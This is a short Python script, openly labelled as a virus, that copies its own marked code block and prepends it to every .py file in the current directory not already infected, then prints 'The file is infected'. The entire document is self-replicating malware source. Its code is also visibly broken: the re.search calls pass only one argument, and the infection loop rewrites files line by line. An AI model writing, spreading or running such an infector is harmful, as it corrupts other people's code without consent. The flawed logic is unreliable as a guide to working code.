#----virus starts------

import sys
import glob
import re

#copy the virus
VirusCode = []

fileh = open(sys.argv[0], "r")
lines = fileh.readlines()
fileh.close()
ifvirusstarted = False

#check if we in the virus
for line in lines:
    if (re.search('#----virus starts------'), line):
        ifvirusstarted = True

    if(ifvirusstarted):
        VirusCode.append(line)

    if(re.search('#----virus ends------'), line):
        ifvirusstarted = False

#copy the virus

#find programs to infect(for example python files with ending #.py)
programs = glob.glob("*.py")

#infect with the virus
for prog in programs:
    fileh = open(prog, 'r')
    Code = fileh.readlines()
    fileh.close()

    for line in Code:
        if('#----virus starts------' in line):
            break

        else:
            newCode = []
            newCode.extend(VirusCode)
            newCode.extend(Code)
            fileh = open(prog, 'w')
            fileh.writelines(newCode)
            fileh.close()


#optional code for the virus to execute
print("The file is infected")


#----virus ends------